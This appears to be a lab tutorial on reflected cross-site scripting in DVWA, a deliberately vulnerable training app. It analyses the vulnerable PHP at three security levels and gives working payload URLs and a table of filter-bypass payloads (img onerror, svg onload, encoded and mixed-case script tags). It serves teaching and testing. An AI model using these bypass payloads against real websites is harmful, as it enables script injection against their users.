
# 🧠 DVWA Reflected XSS – Payload Analysis & Exploitation Guide

This guide explains how reflected XSS vulnerabilities appear in DVWA and how payloads behave across **Low**, **Medium**, and **High** security levels.

---

## 🔍 What Is Reflected XSS?

Reflected Cross-Site Scripting occurs when user input is immediately echoed back in the HTTP response and executed by the browser without proper sanitization. Attackers exploit this to inject malicious scripts into a vulnerable parameter, often delivered via URL.

---

## 📜 Vulnerable Code Analysis

### ✅ Low Security

```php
header ("X-XSS-Protection: 0");

if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    $html .= '<pre>Hello ' . $_GET['name'] . '</pre>';
}
```

- ❌ No sanitization.
- ✅ Directly reflects the input into the HTML body.
- ✅ `X-XSS-Protection: 0` disables browser's built-in XSS filter.

### 🧪 Payload:
```
http://localhost/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
```

### 🔥 Rendered:
```html
<pre>Hello <script>alert('XSS')</script></pre>
```

✅ The browser executes the injected script.

---

### 🛡️ Medium Security

```php
$name = str_replace('<script>', '', $_GET['name']);
```

- ✅ Attempts to filter `<script>`.
- ❌ Does not prevent variations like `<ScRipT>`, event handlers, or image-based injections.

### 🧪 Bypass Payload:
```
http://localhost/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>
```

### 🔥 Rendered:
```html
<pre>Hello <img src=x onerror=alert(1)></pre>
```

✅ Image error triggers JavaScript alert.

---

### 🔐 High Security

```php
$name = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['name']);
```

- ✅ Regex attempts to block variations of `<script>`.
- ❌ Still vulnerable to non-script tag based vectors (e.g., SVG, IMG with events).

### 🧪 Bypass Payload:
```
http://localhost/vulnerabilities/xss_r/?name=<svg/onload=alert(1)>
```

### 🔥 Rendered:
```html
<pre>Hello <svg/onload=alert(1)></pre>
```

✅ JS executes due to SVG event.

---

## 🧰 XSS Payload Construction Strategy

| Step | Strategy |
|------|----------|
| 🔍 1 | Identify how the input is reflected (HTML context, attribute, JS block). |
| 🧠 2 | Analyze encoding/sanitization attempts in code. |
| ✂️ 3 | Escape out of context if needed (`'>`, `</tag>`). |
| 💉 4 | Inject JS using event handlers or script tags. |
| 🧪 5 | Test variants (e.g., `<img>`, `<svg>`, obfuscated `<script>`). |

---

## 🧪 Filter Bypass Techniques

| Technique | Example |
|----------|---------|
| Event Handler | `<img src=x onerror=alert(1)>` |
| SVG-Based | `<svg/onload=alert(1)>` |
| Encoded Input | `%3Cscript%3Ealert(1)%3C/script%3E` |
| Scriptless XSS | `<body onload=alert(1)>` |
| Mixed-case tags | `<ScRipT>alert(1)</ScRipT>` |

---

## ✅ Summary

- Reflected XSS is dangerous due to its immediate execution.
- Low security has no protection.
- Medium and High attempt weak filters but are still vulnerable.
- Filters can be bypassed using creative payload crafting.

> 🔐 Always validate, sanitize, and encode input based on its context in output!

